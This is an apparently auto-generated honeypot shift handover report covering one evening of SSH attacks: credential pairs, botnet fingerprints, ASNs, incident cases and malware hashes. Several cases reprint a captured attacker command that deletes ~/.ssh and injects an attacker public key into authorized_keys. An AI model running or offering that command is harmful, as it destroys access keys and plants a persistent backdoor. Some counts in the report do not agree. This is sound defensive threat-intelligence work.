# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-21 |
| **Generated At** | 2026-05-21T23:06:35Z |
| **Shift Time** | 23:06 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **97** |
| Confirmed Threats | **58** |
| False Positives Filtered | **39** (40.2%) |
| Unique Attacker IPs | **20** |
| Countries of Origin | **13** |
| High Severity Cases | **10** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **87** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **19** |
| Unique Credential Pairs | **11** |
| Unique Usernames | **5** |
| Unique Passwords | **11** |
| Successful Auth Pairs | **7** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 10 |
| `345gs5662d34` | 5 |
| `admin` | 2 |
| `vhserver` | 1 |
| `esuser` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 5 |
| `3245gs5662d34` | 5 |
| `change` | 1 |
| `vhserver` | 1 |
| `esuser` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 5 |
| `root` | `3245gs5662d34` | 5 |
| `root` | `change` | 1 |
| `vhserver` | `vhserver` | 1 |
| `esuser` | `esuser` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `change` | `57.128.222.14` | 2026-05-21T22:14:59 |
| `root` | `3245gs5662d34` | `57.128.222.14` | 2026-05-21T22:15:02 |
| `root` | `!QAZxsw2#EDC` | `83.233.149.56` | 2026-05-21T22:51:38 |
| `root` | `3245gs5662d34` | `83.233.149.56` | 2026-05-21T22:51:43 |
| `root` | `changeme` | `83.233.149.56` | 2026-05-21T22:54:56 |
| `root` | `root1234@` | `83.233.149.56` | 2026-05-21T22:58:14 |
| `root` | `P@ssw0rd@123` | `83.233.149.56` | 2026-05-21T23:01:36 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **97** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 18 |
| OpenSSH | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 18 | 2 |
| `c118de82e19e...` | Mirai/variant | 2 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 18 | 2 | Mirai/variant |
| `c118de82e19e...` | OpenSSH | 2 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **1** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 5 | 2 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `83.233.149.56`, `57.128.222.14`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **20** |
| Unique ASNs | **18** |
| High-Risk ASNs | **7** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS269984` | CORPORACION MATRIX TV, C.A. | 2 | MEDIUM |
| `AS269092` | JPNET SERVICOS DE INFORMATICA E TELECOMUNICACOES L | 2 | LOW |
| `AS3462` | Data Communication Business Group | 1 | HIGH |
| `AS4837` | CHINA UNICOM China169 Backbone | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |
| `AS12430` | VODAFONE ESPANA S.A.U. | 1 | LOW |
| `AS12322` | Free SAS | 1 | MEDIUM |
| `AS272122` | TELECOMUNICACIONES G-NETWORK, C.A. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (10)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a814b421f83a

| Field | Detail |
|---|---|
| **Source IP** | `57.128.222[.]14` |
| **First Seen** | 2026-05-21 22:14 |
| **Last Seen** | 2026-05-21 22:15 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 22:14:58` | `cowrie.session.connect` |
| `2026-05-21 22:14:58` | `cowrie.client.version` |
| `2026-05-21 22:14:58` | `cowrie.client.kex` |
| `2026-05-21 22:14:59` | `cowrie.login.success` |
| `2026-05-21 22:14:59` | `cowrie.session.params` |
| `2026-05-21 22:14:59` | `cowrie.command.input` |
| `2026-05-21 22:14:59` | `cowrie.command.failed` |
| `2026-05-21 22:14:59` | `cowrie.log.closed` |
| `2026-05-21 22:14:59` | `cowrie.session.params` |
| `2026-05-21 22:14:59` | `cowrie.command.input` |
| `2026-05-21 22:15:00` | `cowrie.session.file_download` |
| `2026-05-21 22:15:00` | `cowrie.log.closed` |
| `2026-05-21 22:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.222[.]14` to AbuseIPDB if not already reported
- [ ] Block `57.128.222[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a062ab27e766

| Field | Detail |
|---|---|
| **Source IP** | `57.128.222[.]14` |
| **First Seen** | 2026-05-21 22:15 |
| **Last Seen** | 2026-05-21 22:15 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 22:15:02` | `cowrie.session.connect` |
| `2026-05-21 22:15:02` | `cowrie.client.version` |
| `2026-05-21 22:15:02` | `cowrie.client.kex` |
| `2026-05-21 22:15:02` | `cowrie.login.success` |
| `2026-05-21 22:15:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `57.128.222[.]14` to AbuseIPDB if not already reported
- [ ] Block `57.128.222[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b95912b0e0a

| Field | Detail |
|---|---|
| **Source IP** | `83.233.149[.]56` |
| **First Seen** | 2026-05-21 22:51 |
| **Last Seen** | 2026-05-21 22:51 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 22:51:37` | `cowrie.session.connect` |
| `2026-05-21 22:51:37` | `cowrie.client.version` |
| `2026-05-21 22:51:37` | `cowrie.client.kex` |
| `2026-05-21 22:51:38` | `cowrie.login.success` |
| `2026-05-21 22:51:38` | `cowrie.session.params` |
| `2026-05-21 22:51:38` | `cowrie.command.input` |
| `2026-05-21 22:51:38` | `cowrie.command.failed` |
| `2026-05-21 22:51:39` | `cowrie.log.closed` |
| `2026-05-21 22:51:39` | `cowrie.session.params` |
| `2026-05-21 22:51:39` | `cowrie.command.input` |
| `2026-05-21 22:51:39` | `cowrie.session.file_download` |
| `2026-05-21 22:51:39` | `cowrie.log.closed` |
| `2026-05-21 22:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.149[.]56` to AbuseIPDB if not already reported
- [ ] Block `83.233.149[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4e658c0fe528

| Field | Detail |
|---|---|
| **Source IP** | `83.233.149[.]56` |
| **First Seen** | 2026-05-21 22:51 |
| **Last Seen** | 2026-05-21 22:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 22:51:42` | `cowrie.session.connect` |
| `2026-05-21 22:51:42` | `cowrie.client.version` |
| `2026-05-21 22:51:42` | `cowrie.client.kex` |
| `2026-05-21 22:51:43` | `cowrie.login.success` |
| `2026-05-21 22:51:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.149[.]56` to AbuseIPDB if not already reported
- [ ] Block `83.233.149[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-38ec9a4019af

| Field | Detail |
|---|---|
| **Source IP** | `83.233.149[.]56` |
| **First Seen** | 2026-05-21 22:54 |
| **Last Seen** | 2026-05-21 22:55 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 22:54:55` | `cowrie.session.connect` |
| `2026-05-21 22:54:55` | `cowrie.client.version` |
| `2026-05-21 22:54:55` | `cowrie.client.kex` |
| `2026-05-21 22:54:56` | `cowrie.login.success` |
| `2026-05-21 22:54:56` | `cowrie.session.params` |
| `2026-05-21 22:54:56` | `cowrie.command.input` |
| `2026-05-21 22:54:56` | `cowrie.command.failed` |
| `2026-05-21 22:54:57` | `cowrie.log.closed` |
| `2026-05-21 22:54:57` | `cowrie.session.params` |
| `2026-05-21 22:54:57` | `cowrie.command.input` |
| `2026-05-21 22:54:57` | `cowrie.session.file_download` |
| `2026-05-21 22:54:57` | `cowrie.log.closed` |
| `2026-05-21 22:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.149[.]56` to AbuseIPDB if not already reported
- [ ] Block `83.233.149[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-670fca01d403

| Field | Detail |
|---|---|
| **Source IP** | `83.233.149[.]56` |
| **First Seen** | 2026-05-21 22:55 |
| **Last Seen** | 2026-05-21 22:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 22:55:00` | `cowrie.session.connect` |
| `2026-05-21 22:55:00` | `cowrie.client.version` |
| `2026-05-21 22:55:00` | `cowrie.client.kex` |
| `2026-05-21 22:55:01` | `cowrie.login.success` |
| `2026-05-21 22:55:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.149[.]56` to AbuseIPDB if not already reported
- [ ] Block `83.233.149[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78414490a37d

| Field | Detail |
|---|---|
| **Source IP** | `83.233.149[.]56` |
| **First Seen** | 2026-05-21 22:58 |
| **Last Seen** | 2026-05-21 22:58 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 22:58:13` | `cowrie.session.connect` |
| `2026-05-21 22:58:13` | `cowrie.client.version` |
| `2026-05-21 22:58:13` | `cowrie.client.kex` |
| `2026-05-21 22:58:14` | `cowrie.login.success` |
| `2026-05-21 22:58:14` | `cowrie.session.params` |
| `2026-05-21 22:58:14` | `cowrie.command.input` |
| `2026-05-21 22:58:14` | `cowrie.command.failed` |
| `2026-05-21 22:58:15` | `cowrie.log.closed` |
| `2026-05-21 22:58:15` | `cowrie.session.params` |
| `2026-05-21 22:58:15` | `cowrie.command.input` |
| `2026-05-21 22:58:15` | `cowrie.session.file_download` |
| `2026-05-21 22:58:15` | `cowrie.log.closed` |
| `2026-05-21 22:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.149[.]56` to AbuseIPDB if not already reported
- [ ] Block `83.233.149[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25125e6df2e0

| Field | Detail |
|---|---|
| **Source IP** | `83.233.149[.]56` |
| **First Seen** | 2026-05-21 22:58 |
| **Last Seen** | 2026-05-21 22:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 22:58:18` | `cowrie.session.connect` |
| `2026-05-21 22:58:18` | `cowrie.client.version` |
| `2026-05-21 22:58:18` | `cowrie.client.kex` |
| `2026-05-21 22:58:19` | `cowrie.login.success` |
| `2026-05-21 22:58:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.149[.]56` to AbuseIPDB if not already reported
- [ ] Block `83.233.149[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7e99acbca0d6

| Field | Detail |
|---|---|
| **Source IP** | `83.233.149[.]56` |
| **First Seen** | 2026-05-21 23:01 |
| **Last Seen** | 2026-05-21 23:01 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 23:01:35` | `cowrie.session.connect` |
| `2026-05-21 23:01:35` | `cowrie.client.version` |
| `2026-05-21 23:01:35` | `cowrie.client.kex` |
| `2026-05-21 23:01:36` | `cowrie.login.success` |
| `2026-05-21 23:01:36` | `cowrie.session.params` |
| `2026-05-21 23:01:36` | `cowrie.command.input` |
| `2026-05-21 23:01:36` | `cowrie.command.failed` |
| `2026-05-21 23:01:37` | `cowrie.log.closed` |
| `2026-05-21 23:01:37` | `cowrie.session.params` |
| `2026-05-21 23:01:37` | `cowrie.command.input` |
| `2026-05-21 23:01:37` | `cowrie.session.file_download` |
| `2026-05-21 23:01:37` | `cowrie.log.closed` |
| `2026-05-21 23:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.149[.]56` to AbuseIPDB if not already reported
- [ ] Block `83.233.149[.]56` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c319c51e72e5

| Field | Detail |
|---|---|
| **Source IP** | `83.233.149[.]56` |
| **First Seen** | 2026-05-21 23:01 |
| **Last Seen** | 2026-05-21 23:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-21 23:01:40` | `cowrie.session.connect` |
| `2026-05-21 23:01:40` | `cowrie.client.version` |
| `2026-05-21 23:01:40` | `cowrie.client.kex` |
| `2026-05-21 23:01:41` | `cowrie.login.success` |
| `2026-05-21 23:01:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.233.149[.]56` to AbuseIPDB if not already reported
- [ ] Block `83.233.149[.]56` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `138.197.33[.]109` | **33** | 2026-05-21 21:44 | 2026-05-21 22:39 | 17m | 0 | `T1592` | 🟠 MEDIUM |
| `83.233.149[.]56` | **7** | 2026-05-21 22:43 | 2026-05-21 23:05 | 0m | 7 | `T1110.001 · T1592` | 🟢 LOW |
| `101.206.107[.]245` | **4** | 2026-05-21 22:57 | 2026-05-21 22:59 | 4m | 0 | `T1592` | 🟢 LOW |
| `180.76.172[.]156` | 1 | 2026-05-21 22:46 | 2026-05-21 22:48 | 83s | 1 | `T1110.001` | 🟢 LOW |
| `220.135.110[.]10` | 1 | 2026-05-21 21:59 | 2026-05-21 22:00 | 30s | 0 | `T1592` | 🟢 LOW |
| `57.128.222[.]14` | 1 | 2026-05-21 22:15 | 2026-05-21 22:15 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `8.219.188[.]210` | 1 | 2026-05-21 22:12 | 2026-05-21 22:13 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (28 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `20260429-011658-3f1992b60e9d-0-redir__root_a6s87d6as8zdgtdyas_ini` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260430-003018-0cc07f4bf950-0-redir__dev_watchdog` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `2495e33392ef58d29cef5077b77c6c9164ad3f4cfb2c433b344df7e674542664` | Unknown binary | `2495e33392ef58d2...` | 0/100 | 🟢 LOW | Not in VT |
| `2b78990584d601289f89026783af9871061dc18c4e52a49d0b4caad6a7d3143a` | ELF Binary (Linux executable) (MIPS 32-bit) | `2b78990584d60128...` | 30/100 | 🟢 LOW | Not in VT |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **39/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 44/100 | 🟡 MEDIUM | **35/74** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 13/100 | 🟢 LOW | **33/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **51/74** 🔴 |
